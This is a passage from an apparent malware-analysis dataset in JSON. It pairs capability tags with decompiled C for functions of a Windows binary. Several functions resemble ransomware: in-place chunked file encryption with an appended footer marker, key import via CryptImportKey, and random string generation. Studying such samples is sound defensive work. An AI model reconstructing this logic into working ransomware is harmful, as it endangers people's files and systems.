            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9ch\n\nvoid __cdecl fcn.0040a770(int32_t arg_8h, int32_t hFile, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint32_t arg_18h;\n    uint uVar7;\n    uint in_stack_ffffff54;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint32_t var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    uint32_t var_80h;\n    uint var_7ch;\n    uint var_77h;\n    uint var_70h;\n    uint lpBuffer;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_30h;\n    uint dwMoveMethod;\n    uint var_28h;\n    uint32_t lpFileSize;\n    int32_t var_20h;\n    uint liDistanceToMove;\n    uint lpNewFilePointer;\n    int32_t lpNumberOfBytesWritten;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4705e0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if ((arg_8h != 0) && (hFile != -1)) {\n        in_stack_ffffff54 = 0;\n        arg_8h_00 = fcn.0040ab90(arg_8h, 0, 0x2000);\n        if (0x1fff < arg_8h_00) {\n            lpFileSize = 0;\n            var_20h = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(hFile, &lpFileSize);\n            if (iVar2 != 0) {\n                var_30h = 0;\n                lpNumberOfBytesWritten = 0;\n                fcn.0040ac60(arg_8h_00, 0);\n                fcn.0040ac60(0x1000000, 0);\n                _liDistanceToMove = 0;\n                dwMoveMethod = 0;\n                var_28h = 0;\n                cVar1 = fcn.0040a410(lpFileSize, var_20h);\n                if (cVar1 != '\\0') {\n                    arg_10h = 2;\n                }\n                var_88h = 0;\n                for (var_8ch = 0; (var_88h <= var_20h && ((var_88h < var_20h || (var_8ch < lpFileSize))));\n                    var_8ch = var_8ch + 0x1000000) {\n                    _liDistanceToMove = 0;\n                    iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &dwMoveMethod, 1);\n                    if (iVar2 == 0) {\n                        fcn.004055f0();\n                        fcn.004055f0();\n                        goto code_r0x0040ab68;\n                    }\n                    uVar7 = 0;\n                    puVar6 = &var_30h;\n                    uVar5 = 0x1000000;\n                    uVar4 = 0;\n                    uVar3 = fcn.00405270(0);\n                    iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(hFile, uVar3, uVar4, uVar5, puVar6, uVar7);\n                    if (iVar2 == 0) {\n                        fcn.004055f0();\n                        fcn.004055f0();\n                        goto code_r0x0040ab68;\n                    }\n                    iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)\n                                      (hFile, dwMoveMethod, var_28h, &liDistanceToMove, 0);\n                    if (iVar2 == 0) {\n                        fcn.004055f0();\n                        fcn.004055f0();\n                        goto code_r0x0040ab68;\n                    }\n                    for (var_80h = 0; var_80h < var_30h; var_80h = var_80h + 0x2000) {\n                        iVar2 = fcn.00405220(0x2000);\n                        iVar2 = iVar2 + var_80h;\n                        uVar4 = 0;\n                        uVar3 = fcn.00405270(0);\n                        fcn.00451500(uVar3, uVar4, iVar2);\n                        uVar4 = 0x2000;\n                        arg_18h = arg_8h_00;\n                        uVar3 = fcn.00401440(&var_48h);\n                        cVar1 = fcn.0040abf0(arg_8h, 0, uVar3, uVar4, arg_18h);\n                        if (cVar1 == '\\0') {\n                            fcn.004055f0();\n                            fcn.004055f0();\n                            goto code_r0x0040ab68;\n                        }\n                        uVar3 = fcn.00405220(arg_8h_00, &lpNumberOfBytesWritten, 0);\n                        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, uVar3);\n                        if (iVar2 == 0) {\n                            fcn.004055f0();\n                            fcn.004055f0();\n                            goto code_r0x0040ab68;\n                        }\n                    }\n                    if (arg_10h == 1) break;\n                    var_88h = var_88h + (0xfeffffff < var_8ch);\n                }\n                _liDistanceToMove = 0;\n                dwMoveMethod = 0;\n                var_28h = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)(hFile, 0, 0, &dwMoveMethod, 2);\n                if (iVar2 != 0) {\n                    uVar3 = fcn.00404d90(&lpNumberOfBytesWritten, 0);\n                    uVar3 = fcn.00405220(uVar3);\n                    iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, uVar3);\n                    if ((iVar2 != 0) && (iVar2 = fcn.00404d90(),  lpNumberOfBytesWritten == iVar2)) {\n                        var_4ch = 0xbeefcace;\n                        _lpBuffer = CONCAT44(var_20h, lpFileSize);\n                        var_50h = arg_10h;\n                        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(hFile, &lpBuffer, 0x10, &lpNumberOfBytesWritten, 0);\n                        if ((iVar2 != 0) && (lpNumberOfBytesWritten == 0x10)) {\n                            fcn.004055f0();\n                            fcn.004055f0();\n                            goto code_r0x0040ab68;\n                        }\n                    }\n                }\n                fcn.004055f0();\n                fcn.004055f0();\n            }\n        }\n    }\ncode_r0x0040ab68:\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffff54);\n    return;\n}\n",
        "token_count": 1720
    },
    "0040bbc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040bbc0(uchar *param_1)\n\n{\n    uint var_4h;\n    \n    if (*(param_1 + 0x10) != 0) {\n        fcn.0040c030(*(param_1 + 0x10));\n        *(param_1 + 0x10) = 0;\n    }\n    if (*(param_1 + 4) != 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (*(param_1 + 0xc) != 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(*(param_1 + 0xc), 0);\n        *(param_1 + 0xc) = 0;\n    }\n    if (*(param_1 + 8) != 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(*(param_1 + 8), 0);\n        *(param_1 + 8) = 0;\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 260
    },
    "0040bcd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __fastcall fcn.0040bcd0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint phProv;\n    uint var_1h;\n    \n    if (*(param_1 + 0xc) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(param_1 + 0xc, 0, 0x485ad0, 1, 0xf0000000);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == -0x7ff6ffea) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                                  (param_1 + 0xc, 0, L\"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 8);\n                bVar2 = iVar1 != 0;\n            }\n            else {\n                bVar2 = false;\n            }\n        }\n        else {\n            bVar2 = true;\n        }\n    }\n    else {\n        bVar2 = true;\n    }\n    return bVar2;\n}\n",
        "token_count": 277
    },
    "0040bd50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nbool __fastcall fcn.0040bd50(int32_t param_1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint phProv;\n    uint var_1h;\n    \n    if (*(param_1 + 8) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(param_1 + 8, 0, 0, 0x18, 0);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == -0x7ff6ffea) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(param_1 + 8, 0, 0, 0x18, 8);\n                bVar2 = iVar1 != 0;\n            }\n            else {\n                bVar2 = false;\n            }\n        }\n        else {\n            bVar2 = true;\n        }\n    }\n    else {\n        bVar2 = true;\n    }\n    return bVar2;\n}\n",
        "token_count": 259
    },
    "0040bdc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bdc0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint var_14h;\n    uint pbData;\n    uint var_9h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_9h._0_1_ = 0;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        stack0xfffffff4 = 0;\n        uVar2 = fcn.00405220(0, 1, 0, &var_9h + 1, 0, 0);\n        iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2);\n        if (iVar3 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, stack0xfffffff4);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (iVar3 != 0) {\n                uVar2 = fcn.00405220(0, 1, iVar3, &var_9h + 1, 0, 0);\n                iVar4 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2);\n                if ((iVar4 != 0) &&\n                   (iVar4 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)\n                                      (*(in_ECX + 0xc), iVar3, stack0xfffffff4, 0, 0, in_ECX + 4),  iVar4 != 0)) {\n                    var_9h._0_1_ = 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n    }\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 504
    },
    "0040beb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040beb0(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t arg_10h;\n    int32_t arg_8h;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff84;\n    int32_t arg_10h_00;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4705b0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.0040bff0(param_1 + 0x10);\n    if (cVar1 != '\\0') {\n        arg_10h = fcn.0040c050(*(param_1 + 0x10));\n        arg_8h = fcn.0040ab90(*(param_1 + 4), 1, arg_10h);\n        if ((arg_10h != 0) && (arg_8h != 0)) {\n            fcn.0040ac60(arg_8h, 0);\n            arg_10h_00 = arg_10h;\n            uVar2 = fcn.00401440(&var_28h);\n            cVar1 = fcn.0040c0a0(*(param_1 + 0x10), uVar2, arg_10h_00);\n            if (cVar1 != '\\0') {\n                uVar2 = fcn.00401440(&var_28h);\n                in_stack_ffffff84 = *(param_1 + 4);\n                cVar1 = fcn.0040abf0(in_stack_ffffff84, 1, uVar2, arg_10h, arg_8h);\n                if (cVar1 != '\\0') {\n                    fcn.00405580(&var_28h);\n                    fcn.004055f0();\n                    goto code_r0x0040bfbf;\n                }\n            }\n            fcn.004055f0();\n        }\n    }\ncode_r0x0040bfbf:\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffff84);\n    return;\n}\n",
        "token_count": 561
    },
    "0040c030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c030(int32_t hKey)\n\n{\n    uint var_4h;\n    \n    if (hKey != 0) {\n        (*_sym.imp.ADVAPI32.dll_CryptDestroyKey)(hKey);\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0040c250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c250(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h_01;\n    int32_t *in_FS_OFFSET;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470230;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    if (arg_ch == 0) {\n        fcn.00405750(0x482351);\n    }\n    else {\n        fcn.00405750(0x485b90);\n        while (uVar1 = fcn.00404d90(),  uVar1 < arg_ch) {\n            iVar2 = fcn.00456541();\n            iVar2 = iVar2 % 3;\n            if (iVar2 == 0) {\n                uVar1 = fcn.0040c480();\n                fcn.0040c5a0(uVar1 & 0xff);\n            }\n            else if (iVar2 == 1) {\n                uVar1 = fcn.0040c4e0();\n                fcn.0040c5a0(uVar1 & 0xff);\n            }\n            else if (iVar2 == 2) {\n                uVar1 = fcn.0040c540();\n                fcn.0040c5a0(uVar1 & 0xff);\n            }\n        }\n        arg_8h_01 = fcn.00401440(&var_28h);\n        fcn.004056d0(arg_8h_01);\n        fcn.004055f0();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 489
    },
    "0040d4b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040d4b0(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040e4e0(param_1);\n    if (1 < uVar1) {\n        fcn.0040e470();\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0040dab0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040dab0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00404c30();\n    var_4h = uVar1 == 1;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 82
    },
    "0040e730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e730(uint arg_8h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int32_t *in_FS_OFFSET;\n    uint *arg_10h;\n    uint32_t arg_8h_00;\n    uint *var_230h;\n    uint var_22ch;\n    uint8_t var_225h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470a17;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &fcn.0040e730::var_ch;\n    var_230h = fcn.0043a4f7(4, var_10h);\n    if (var_230h == NULL) {\n        var_230h = NULL;\n    }\n    else {\n        *var_230h = 0;\n    }\n    fcn.00410000(var_230h, fcn.0040f270);\n    var_4h = 0;\n    fcn.0040cec0(arg_8h);\n    var_4h._0_1_ = 1;\n    fcn.0040d0d0();\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    var_21ch = 0;\n    puVar2 = &fcn.0040e730::var_220h;\n    arg_10h = &fcn.0040e730::var_21ch;\n    uVar1 = fcn.0040cf70();\n    uVar1 = fcn.004258dc(&fcn.0040e730::var_218h, uVar1, arg_10h, puVar2);\n    puVar2 = fcn.00406250();\n    *puVar2 = uVar1;\n    arg_8h_00 = 0x40e82f;\n    piVar3 = fcn.00406250();\n    if (*piVar3 != 0) {\n        arg_8h_00 = var_225h;\n        fcn.0040f100(&fcn.0040e730::var_218h, var_220h);\n    }\n    var_4h = 0xffffffff;\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 611
    },
    "0040e880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e880(uint param_1)\n\n{\n    uint32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4703d0;\n    var_ch = *in_FS_OFFSET;\n    arg_8h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_18h = fcn.0043a4f7(4, arg_8h);\n    if (var_18h == NULL) {\n        var_18h = NULL;\n    }\n    else {\n        *var_18h = 0;\n    }\n    fcn.00410000(var_18h, fcn.0040f270);\n    fcn.0040cea0();\n    fcn.0040d0d0();\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 252
    },
    "0040f1b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f1b0(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint *in_stack_fffffdd8;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    piVar1 = fcn.00406250();\n    if (*piVar1 != 0) {\n        puVar4 = &var_210h;\n        puVar2 = fcn.00406250();\n        in_stack_fffffdd8 = &var_20ch;\n        piVar3 = fcn.00425a03(in_stack_fffffdd8, *puVar2, puVar4);\n        if (*piVar3 == 0) {\n            puVar4 = fcn.00406250();\n            fcn.004258c5(*puVar4);\n            puVar4 = fcn.00406250();\n            *puVar4 = 0;\n        }\n        else {\n            in_stack_fffffdd8 = &var_20ch;\n            fcn.0040f100(in_stack_fffffdd8, var_210h);\n        }\n    }\n    fcn.0043a2e7(in_stack_fffffdd8);\n    return;\n}\n",
        "token_count": 321
    },
    "0040f270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f270(int32_t *arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != NULL) && (*arg_8h != 0)) {\n        fcn.004258c5(*arg_8h);\n    }\n    fcn.0043a7bc(arg_8h);\n    return;\n}\n",
        "token_count": 91
    },
    "0040f4a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.0040f4a0(uint param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch_2;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    arg_8h = var_ch_2;\n    uStack12 = 0x470a90;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h = 0;\n    for (; var_ch_2 != 0; var_ch_2 = var_ch_2 + -1) {\n        fcn.004101f0(var_8h, var_10h_2);\n    }\n    var_4h = 0xffffffff;\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0043a2e7(arg_8h);\n    return;\n}\n",
        "token_count": 295
    },
    "0040f7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f7b0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar2;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470ac0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    uVar3 = 1;\n    fcn.00404960();\n    arg_8h = fcn.0040f8a0(uVar3);\n    if (var_8h == 0) {\n        var_8h = arg_8h;\n        var_ch_2 = arg_8h;\n    }\n    uVar3 = fcn.00404960();\n    var_4h = 0;\n    puVar2 = &param_1;\n    uVar1 = fcn.00401440(arg_8h);\n    fcn.00408ce0(uVar3, uVar1, puVar2);\n    puVar2 = &param_2;\n    uVar1 = fcn.00401440(arg_8h + 4);\n    fcn.00408ce0(uVar3, uVar1, puVar2);\n    *in_FS_OFFSET = var_ch_3;\n    return arg_8h;\n}\n",
        "token_count": 390
    },
    "00410090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00410090(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch < arg_18h) || (arg_ch - arg_18h < arg_10h)) {\n        arg_10h = 0xffffffff;\n    }\n    else if (arg_18h != 0) {\n        var_4h = arg_8h + arg_10h * 2;\n        while (var_4h = fcn.00409ef0(var_4h, (arg_8h + 2 + (arg_ch - arg_18h) * 2) - var_4h >> 1, arg_14h),  var_4h != 0\n              ) {\n            iVar1 = fcn.004105b0(var_4h, arg_14h, arg_18h);\n            if (iVar1 == 0) {\n                return var_4h - arg_8h >> 1;\n            }\n            var_4h = var_4h + 2;\n        }\n        arg_10h = 0xffffffff;\n    }\n    return arg_10h;\n}\n",
        "token_count": 301
    },
    "00410a00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410a00(uint param_1)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_3;\n    uint var_10h;\n    uint var_ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    int32_t var_4h;\n    \n    uStack12 = 0x470c4f;\n    var_ch_2 = *in_FS_OFFSET;\n    arg_8h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h = 0;\n    iVar1 = fcn.0043a4f7(0x14, arg_8h);\n    var_4h._0_1_ = 1;\n    if (iVar1 == 0) {\n        var_18h = 0;\n    }\n    else {\n        fcn.00401b10(0x14);\n        puVar2 = fcn.00401440(&var_ch_3);\n        var_18h = fcn.00410d70(var_8h, *puVar2);\n    }\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00410f60(var_8h, var_18h);\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 382
    },
    "00411ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.00411ae0(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    int32_t var_ch_2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint arg_8h;\n    uint32_t uStack132;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_5ch;\n    uint var_50h;\n    uint var_49h;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470d58;\n    var_ch_3 = *in_FS_OFFSET;\n    uStack132 = *0x49106c ^ &stack0xfffffffc;\n    puStack20 = &uStack132;\n    *in_FS_OFFSET = &var_ch_3;\n    var_49h._0_1_ = '\\0';\n    arg_8h = 0;\n    var_14h_2 = uStack132;\n    fcn.00425354(0);\n    if (var_ch_2 != 0) {\n        var_4h = 0;\n        arg_8h = 0x34;\n        fcn.00401b10(0x34);\n        uVar2 = fcn.00405220();\n        fcn.00411960(var_ch_2, uVar2);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        cVar1 = fcn.00411d20(&var_49h + 1);\n        if (cVar1 == '\\0') {\n            fcn.00423ace(&var_49h + 1, var_ch_2, *(param_1 + 4), 0);\n            *(*(param_1 + 4) + 0x10) = var_ch_2;\n            uVar2 = fcn.00405220();\n            fcn.00404b30(uVar2);\n        }\n        else {\n            var_49h._0_1_ = '\\x01';\n        }\n        var_4h = var_4h & 0xffffff00;\n        fcn.004016b0();\n        var_4h = 0xffffffff;\n    }\n    if (var_49h != '\\0') {\n        puVar3 = (**(**(param_1 + 4) + 8))();\n        if (puVar3 != NULL) {\n            (***puVar3)(1);\n        }\n        fcn.00425786(\"bad locale name\");\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0043a2e7(arg_8h);\n    return;\n}\n",
        "token_count": 684
    },
    "00411c90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
